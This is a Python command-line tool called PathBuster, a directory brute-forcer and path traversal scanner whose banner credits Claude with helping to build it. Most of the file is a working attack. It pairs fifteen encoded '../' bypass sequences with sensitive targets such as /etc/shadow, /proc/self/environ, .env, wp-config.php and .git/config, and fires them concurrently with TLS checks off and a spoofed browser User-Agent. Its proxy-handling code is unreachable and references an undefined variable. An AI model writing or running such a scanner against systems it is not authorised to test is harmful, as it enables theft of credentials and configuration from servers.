#!/usr/bin/env python3

import asyncio
import aiohttp
import argparse
import sys
import os
import time
import json
import random
import itertools
from urllib.parse import urljoin, urlparse, quote
from dataclasses import dataclass, field, asdict
from typing import Optional
from datetime import datetime
from pathlib import Path

# RAINBOW ASCII BANNER

ANSI_RAINBOW = [
    "\033[91m",  # red
    "\033[93m",  # yellow
    "\033[92m",  # green
    "\033[96m",  # cyan
    "\033[94m",  # blue
    "\033[95m",  # magenta
]
RESET = "\033[0m"
BOLD  = "\033[1m"
DIM   = "\033[2m"
WHITE = "\033[97m"

BANNER_LINES = r"""
██████╗  █████╗ ████████╗██╗  ██╗  ██████╗ ██╗   ██╗███████╗████████╗███████╗██████╗
██╔══██╗██╔══██╗╚══██╔══╝██║  ██║  ██╔══██╗██║   ██║██╔════╝╚══██╔══╝██╔════╝██╔══██╗
██████╔╝███████║   ██║   ███████║  ██████╔╝██║   ██║███████╗   ██║   █████╗  ██████╔╝
██╔═══╝ ██╔══██║   ██║   ██╔══██║  ██╔══██╗██║   ██║╚════██║   ██║   ██╔══╝  ██╔══██╗
██║     ██║  ██║   ██║   ██║  ██║  ██████╔╝╚██████╔╝███████║   ██║   ███████╗██║  ██║
╚═╝     ╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝  ╚═════╝  ╚═════╝ ╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝

Tool By MrBeyson
Warning: CLAUDE WAS USED IN THE MAKING OF THIS TOOL
""".strip("\n")

SUBTITLE = " Path Traversal & Directory Bruteforcer "
DIVIDER  = "─" * 88


def print_rainbow_banner() -> None:
    color_cycle = itertools.cycle(ANSI_RAINBOW)
    print()
    for line in BANNER_LINES.split("\n"):
        colored = ""
        for ch in line:
            colored += next(color_cycle) + ch
        print(colored + RESET)
    print()

    sub_colored = ""
    for i, ch in enumerate(SUBTITLE):
        sub_colored += ANSI_RAINBOW[i % len(ANSI_RAINBOW)] + ch
    print(BOLD + sub_colored + RESET)
    print(DIM + WHITE + DIVIDER + RESET)
    print()

# DATA STRUCT

@dataclass
class ScanResult:
    url:         str
    status_code: int
    content_length: int
    redirect_url: Optional[str]
    scan_type:   str          # "dirbrute" | "traversal"
    payload:     str
    elapsed_ms:  float
    timestamp:   str = field(default_factory=lambda: datetime.utcnow().isoformat())


@dataclass
class ScanConfig:
    target:          str
    wordlist:        str
    threads:         int
    timeout:         float
    extensions:      list[str]
    status_filter:   list[int]
    traversal_depth: int
    traversal_payloads: list[str]
    user_agent:      str
    output_file:     Optional[str]
    follow_redirects: bool
    delay_ms:        float
    proxy:           Optional[str]

BASE_TRAVERSAL_SEQUENCES = [
    "../",
    "..\\",
    "..%2F",
    "..%5C",
    "%2e%2e%2f",
    "%2e%2e%5c",
    "%2e%2e/",
    "..%252F",
    "..%c0%af",
    "..%c1%9c",
    "..%ef%bc%8f",
    "....//",
    "....\\\\",
    "..;/",
    "%252e%252e%252f",
]

TRAVERSAL_TARGETS = [
    "etc/passwd",
    "etc/shadow",
    "etc/hosts",
    "etc/hostname",
    "etc/os-release",
    "proc/self/environ",
    "proc/version",
    "proc/self/cmdline",
    "proc/self/fd/0",
    "var/log/auth.log",
    "var/log/syslog",
    "var/log/apache2/access.log",
    "var/log/nginx/access.log",
    "windows/win.ini",
    "windows/system.ini",
    "windows/system32/drivers/etc/hosts",
    "boot.ini",
    "inetpub/wwwroot/web.config",
    "web.config",
    "WEB-INF/web.xml",
    ".env",
    ".git/config",
    ".git/HEAD",
    "config.php",
    "wp-config.php",
    "config.yml",
    "config.yaml",
    "database.yml",
    "settings.py",
    "local_settings.py",
    "application.properties",
    "appsettings.json",
]


def generate_traversal_payloads(depth: int) -> list[tuple[str, str]]:
    """
    Returns list of (display_payload, encoded_url_segment) tuples.
    Tries every traversal sequence at every depth against every target file.
    """
    results: list[tuple[str, str]] = []
    for seq in BASE_TRAVERSAL_SEQUENCES:
        for d in range(1, depth + 1):
            prefix = seq * d
            for target in TRAVERSAL_TARGETS:
                payload_display = prefix + target
                results.append((payload_display, payload_display))
    return results

# WORDLIST LOADER

BUILTIN_WORDLIST = [
    "admin", "administrator", "login", "logout", "dashboard", "panel", "control",
    "api", "api/v1", "api/v2", "api/v3", "api/internal", "swagger", "swagger-ui",
    "swagger.json", "openapi.json", "graphql", "graphiql", "rest", "rpc",
    "backup", "backups", "bak", "old", "archive", "archives", "temp", "tmp",
    "uploads", "upload", "files", "file", "assets", "static", "media",
    "images", "img", "css", "js", "scripts", "includes",
    "config", "conf", "configuration", "settings", "env", "environment",
    ".env", ".git", ".svn", ".htaccess", ".htpasswd", "robots.txt", "sitemap.xml",
    "wp-admin", "wp-login.php", "wp-config.php", "wp-content", "wp-includes",
    "phpmyadmin", "phpinfo.php", "info.php", "test.php", "shell.php",
    "console", "debug", "trace", "log", "logs", "error", "errors",
    "user", "users", "account", "accounts", "profile", "member", "members",
    "register", "signup", "forgot", "reset", "auth", "oauth", "token", "tokens",
    "secret", "secrets", "private", "internal", "hidden",
    "db", "database", "sql", "mysql", "postgres", "mongo",
    "jenkins", "jira", "confluence", "gitlab", "github",
    "health", "status", "metrics", "ping", "version", "info", "about",
    "cgi-bin", "cgi", "bin", "exec", "run", "cmd", "command",
    "search", "query", "download", "export", "import", "report", "reports",
    "invoice", "invoices", "payment", "payments", "checkout", "cart",
    "index", "home", "main", "default", "welcome",
    "404", "500", "error", "maintenance", "coming-soon",
    "dev", "development", "staging", "stage", "test", "testing", "qa", "prod",
    "v1", "v2", "v3", "v4", "latest", "current",
    "xml", "json", "csv", "xls", "xlsx", "pdf", "zip", "tar", "gz",
    "server-status", "server-info", ".well-known", "security.txt",
]


def load_wordlist(path: str) -> list[str]:
    if path == "__builtin__":
        return BUILTIN_WORDLIST
    p = Path(path)
    if not p.exists():
        print(f"  {ANSI_RAINBOW[0]}[ERROR]{RESET} Wordlist not found: {path}")
        sys.exit(1)
    with open(p, "r", encoding="utf-8", errors="ignore") as f:
        words = [line.strip() for line in f if line.strip() and not line.startswith("#")]
    return words


# ASYNC HTTP ENGINE

class PathBuster:
    def __init__(self, config: ScanConfig) -> None:
        self.config  = config
        self.results: list[ScanResult] = []
        self._sem    = asyncio.Semaphore(config.threads)
        self._total  = 0
        self._done   = 0
        self._found  = 0
        self._start  = 0.0

    def _build_connector(self) -> aiohttp.TCPConnector:
        return aiohttp.TCPConnector(
            ssl=False,
            limit=self.config.threads,
            ttl_dns_cache=300,
            use_dns_cache=True,
        )

    def _build_session_kwargs(self) -> dict:
        return {
            "connector": self._build_connector(),
            "timeout": aiohttp.ClientTimeout(total=self.config.timeout),
            "headers": {"User-Agent": self.config.user_agent},
        }
        if self.config.proxy:
            kwargs["proxy"] = self.config.proxy
        return kwargs

    def _status_color(self, code: int) -> str:
        if code in (200, 201, 204):
            return ANSI_RAINBOW[2]   # green
        if code in (301, 302, 307, 308):
            return ANSI_RAINBOW[0]   # red/orange
        if code == 401:
            return ANSI_RAINBOW[4]   # blue
        if code == 403:
            return ANSI_RAINBOW[3]   # cyan
        if code == 500:
            return ANSI_RAINBOW[5]   # magenta
        return DIM + WHITE

    def _print_hit(self, r: ScanResult) -> None:
        color  = self._status_color(r.status_code)
        label  = "[TRAVERSAL]" if r.scan_type == "traversal" else "[DIR]      "
        redir  = f" → {r.redirect_url}" if r.redirect_url else ""
        length = f"{r.content_length:>8} B" if r.content_length >= 0 else "     ? B"
        elapsed= f"{r.elapsed_ms:>6.0f}ms"
        line   = (
            f"  {color}{label}{RESET} "
            f"{color}{r.status_code}{RESET} "
            f"{WHITE}{r.url}{RESET}"
            f"{DIM}{redir}{RESET} "
            f"{DIM}[{length}] [{elapsed}]{RESET}"
        )
        print(line)

    def _print_progress(self) -> None:
        pct    = (self._done / self._total * 100) if self._total else 0
        bar_w  = 30
        filled = int(bar_w * self._done / max(self._total, 1))
        bar    = "█" * filled + "░" * (bar_w - filled)
        color  = ANSI_RAINBOW[filled % len(ANSI_RAINBOW)]
        elapsed = time.monotonic() - self._start
        rps    = self._done / max(elapsed, 0.001)
        sys.stdout.write(
            f"\r  {color}[{bar}]{RESET} "
            f"{pct:>5.1f}% "
            f"{DIM}({self._done}/{self._total}) "
            f"found={RESET}{ANSI_RAINBOW[2]}{self._found}{RESET} "
            f"{DIM}{rps:.0f} req/s{RESET}   "
        )
        sys.stdout.flush()

    async def _probe(
        self,
        session: aiohttp.ClientSession,
        url: str,
        payload: str,
        scan_type: str,
    ) -> Optional[ScanResult]:
        async with self._sem:
            if self.config.delay_ms > 0:
                await asyncio.sleep(self.config.delay_ms / 1000.0)
            t0 = time.monotonic()
            try:
                async with session.get(
                    url,
                    allow_redirects=self.config.follow_redirects,
                    proxy=self.config.proxy,
                ) as resp:
                    elapsed_ms = (time.monotonic() - t0) * 1000
                    body       = await resp.read()
                    cl         = len(body)
                    redir      = None
                    if not self.config.follow_redirects and resp.status in (301, 302, 307, 308):
                        redir = resp.headers.get("Location")
                    return ScanResult(
                        url=url,
                        status_code=resp.status,
                        content_length=cl,
                        redirect_url=redir,
                        scan_type=scan_type,
                        payload=payload,
                        elapsed_ms=elapsed_ms,
                    )
            except (aiohttp.ClientError, asyncio.TimeoutError, OSError):
                elapsed_ms = (time.monotonic() - t0) * 1000
                return ScanResult(
                    url=url,
                    status_code=0,
                    content_length=-1,
                    redirect_url=None,
                    scan_type=scan_type,
                    payload=payload,
                    elapsed_ms=elapsed_ms,
                )

    async def _worker(
        self,
        session: aiohttp.ClientSession,
        url: str,
        payload: str,
        scan_type: str,
    ) -> None:
        result = await self._probe(session, url, payload, scan_type)
        self._done += 1
        self._print_progress()
        if result and result.status_code in self.config.status_filter:
            self._found += 1
            self.results.append(result)
            print()
            self._print_hit(result)

    #  Dir Bruteforce

    def _build_dir_urls(self, words: list[str]) -> list[tuple[str, str]]:
        base = self.config.target.rstrip("/")
        pairs: list[tuple[str, str]] = []
        for word in words:
            pairs.append((f"{base}/{word}", word))
            for ext in self.config.extensions:
                if not word.endswith(ext):
                    pairs.append((f"{base}/{word}{ext}", f"{word}{ext}"))
        return pairs

    async def run_dirbrute(self, words: list[str]) -> None:
        pairs = self._build_dir_urls(words)
        self._total += len(pairs)
        print(
            f"\n  {ANSI_RAINBOW[2]}[*]{RESET} Directory bruteforce "
            f"— {BOLD}{len(pairs)}{RESET} probes "
            f"({len(words)} words × {len(self.config.extensions) + 1} variants)\n"
        )
        async with aiohttp.ClientSession(**self._build_session_kwargs()) as session:
            tasks = [
                asyncio.create_task(self._worker(session, url, word, "dirbrute"))
                for url, word in pairs
            ]
            await asyncio.gather(*tasks)
        print()

    #  Path Traversal

    def _build_traversal_urls(self) -> list[tuple[str, str]]:
        base   = self.config.target.rstrip("/")
        parsed = urlparse(base)
        # Inject traversal after each path segment
        path_parts  = [p for p in parsed.path.split("/") if p]
        inject_urls: list[tuple[str, str]] = []
        payloads = generate_traversal_payloads(self.config.traversal_depth)
        for display_payload, raw_payload in payloads:
            # Direct injection at base
            url = f"{base}/{raw_payload}"
            inject_urls.append((url, display_payload))
            # After each existing path segment
            for i in range(len(path_parts)):
                prefix = "/".join(path_parts[: i + 1])
                url    = f"{parsed.scheme}://{parsed.netloc}/{prefix}/{raw_payload}"
                inject_urls.append((url, display_payload))
        return inject_urls

    async def run_traversal(self) -> None:
        pairs = self._build_traversal_urls()
        self._total += len(pairs)
        print(
            f"\n  {ANSI_RAINBOW[3]}[*]{RESET} Path traversal sweep "
            f"— {BOLD}{len(pairs)}{RESET} probes "
            f"({len(BASE_TRAVERSAL_SEQUENCES)} sequences × depth {self.config.traversal_depth} "
            f"× {len(TRAVERSAL_TARGETS)} targets)\n"
        )
        async with aiohttp.ClientSession(**self._build_session_kwargs()) as session:
            tasks = [
                asyncio.create_task(self._worker(session, url, payload, "traversal"))
                for url, payload in pairs
            ]
            await asyncio.gather(*tasks)
        print()

    # Report

    def print_summary(self) -> None:
        elapsed = time.monotonic() - self._start
        dir_hits = [r for r in self.results if r.scan_type == "dirbrute"]
        trav_hits = [r for r in self.results if r.scan_type == "traversal"]

        print()
        print(DIM + WHITE + DIVIDER + RESET)
        print(f"\n  {BOLD}SCAN COMPLETE{RESET}\n")
        print(f"  {DIM}Target        :{RESET} {self.config.target}")
        print(f"  {DIM}Elapsed       :{RESET} {elapsed:.1f}s")
        print(f"  {DIM}Total probes  :{RESET} {self._done}")
        print(f"  {DIM}Requests/sec  :{RESET} {self._done / max(elapsed, 0.001):.0f}")
        print()
        if dir_hits:
            print(f"  {ANSI_RAINBOW[2]}[DIR HITS — {len(dir_hits)}]{RESET}")
            for r in sorted(dir_hits, key=lambda x: x.status_code):
                color = self._status_color(r.status_code)
                print(f"    {color}{r.status_code}{RESET}  {r.url}")
        if trav_hits:
            print(f"\n  {ANSI_RAINBOW[3]}[TRAVERSAL HITS — {len(trav_hits)}]{RESET}")
            for r in sorted(trav_hits, key=lambda x: x.status_code):
                color = self._status_color(r.status_code)
                print(f"    {color}{r.status_code}{RESET}  {r.url}")
                print(f"    {DIM}    payload: {r.payload[:80]}{RESET}")
        if not self.results:
            print(f"  {DIM}No hits in filter ({', '.join(str(c) for c in self.config.status_filter)}){RESET}")
        print()

    def save_report(self) -> None:
        if not self.config.output_file:
            return
        report = {
            "target":     self.config.target,
            "timestamp":  datetime.utcnow().isoformat(),
            "total_probes": self._done,
            "hits":       len(self.results),
            "results":    [asdict(r) for r in self.results],
        }
        with open(self.config.output_file, "w") as f:
            json.dump(report, f, indent=2)
        print(f"  {ANSI_RAINBOW[2]}[+]{RESET} Report saved → {BOLD}{self.config.output_file}{RESET}\n")

    async def run(self, words: list[str], mode: str) -> None:
        self._start = time.monotonic()
        if mode in ("dir", "both"):
            await self.run_dirbrute(words)
        if mode in ("traversal", "both"):
            await self.run_traversal()
        print("\r" + " " * 100 + "\r", end="")
        self.print_summary()
        self.save_report()


# CLI

def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog="pathbuster",
        description="Path Traversal & Directory Bruteforce Toolkit",
        formatter_class=argparse.RawTextHelpFormatter,
    )
    p.add_argument("target",  help="Target base URL  (e.g. https://target.internal/app)")
    p.add_argument(
        "-m", "--mode",
        choices=["dir", "traversal", "both"],
        default="both",
        help="Scan mode: dir | traversal | both  (default: both)",
    )
    p.add_argument(
        "-w", "--wordlist",
        default="__builtin__",
        help="Path to wordlist file  (default: built-in 100-word list)",
    )
    p.add_argument(
        "-t", "--threads",
        type=int,
        default=50,
        help="Concurrent requests  (default: 50)",
    )
    p.add_argument(
        "--timeout",
        type=float,
        default=8.0,
        help="Per-request timeout in seconds  (default: 8.0)",
    )
    p.add_argument(
        "-e", "--extensions",
        default=".php,.html,.js,.json,.txt,.bak,.old,.zip,.tar.gz,.xml,.yml,.env",
        help="Comma-separated extensions to append  (default: .php,.html,.js,...)",
    )
    p.add_argument(
        "-s", "--status",
        default="200,201,204,301,302,307,401,403,500",
        help="Comma-separated status codes to report  (default: 200,201,204,301,302,307,401,403,500)",
    )
    p.add_argument(
        "-d", "--depth",
        type=int,
        default=6,
        help="Traversal depth — how many ../ sequences to try  (default: 6)",
    )
    p.add_argument(
        "-o", "--output",
        default=None,
        help="Save JSON report to this file",
    )
    p.add_argument(
        "--user-agent",
        default="Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
        help="Custom User-Agent header",
    )
    p.add_argument(
        "--no-follow",
        action="store_true",
        help="Do not follow redirects (capture Location header instead)",
    )
    p.add_argument(
        "--delay",
        type=float,
        default=0.0,
        help="Delay between requests in milliseconds  (default: 0)",
    )
    p.add_argument(
        "--proxy",
        default=None,
        help="HTTP proxy URL  (e.g. http://127.0.0.1:8080 for Burp)",
    )
    p.add_argument(
        "--no-banner",
        action="store_true",
        help="Suppress the rainbow banner",
    )
    return p


def validate_target(target: str) -> str:
    parsed = urlparse(target)
    if parsed.scheme not in ("http", "https"):
        print(f"  {ANSI_RAINBOW[0]}[ERROR]{RESET} Target must start with http:// or https://")
        sys.exit(1)
    if not parsed.netloc:
        print(f"  {ANSI_RAINBOW[0]}[ERROR]{RESET} Target has no host: {target}")
        sys.exit(1)
    return target


def main() -> None:
    parser = build_parser()
    args   = parser.parse_args()

    if not args.no_banner:
        print_rainbow_banner()

    target = validate_target(args.target)
    extensions = [e.strip() for e in args.extensions.split(",") if e.strip()]
    status_filter = [int(s.strip()) for s in args.status.split(",") if s.strip().isdigit()]

    config = ScanConfig(
        target=target,
        wordlist=args.wordlist,
        threads=args.threads,
        timeout=args.timeout,
        extensions=extensions,
        status_filter=status_filter,
        traversal_depth=args.depth,
        traversal_payloads=[],
        user_agent=args.user_agent,
        output_file=args.output,
        follow_redirects=not args.no_follow,
        delay_ms=args.delay,
        proxy=args.proxy,
    )

    print(f"  {ANSI_RAINBOW[4]}[CONFIG]{RESET}")
    print(f"    target     : {BOLD}{config.target}{RESET}")
    print(f"    mode       : {args.mode}")
    print(f"    threads    : {config.threads}")
    print(f"    timeout    : {config.timeout}s")
    print(f"    depth      : {config.traversal_depth}")
    print(f"    extensions : {', '.join(config.extensions)}")
    print(f"    status     : {', '.join(str(s) for s in config.status_filter)}")
    if config.proxy:
        print(f"    proxy      : {config.proxy}")
    if config.output_file:
        print(f"    output     : {config.output_file}")
    print()

    words = load_wordlist(config.wordlist)
    print(f"  {ANSI_RAINBOW[1]}[+]{RESET} Wordlist loaded — {BOLD}{len(words)}{RESET} entries\n")

    buster = PathBuster(config)
    try:
        asyncio.run(buster.run(words, args.mode))
    except KeyboardInterrupt:
        print(f"\n\n  {ANSI_RAINBOW[0]}[INTERRUPTED]{RESET} Scan stopped by user.\n")
        buster.print_summary()
        buster.save_report()
        sys.exit(130)


if __name__ == "__main__":
    main()
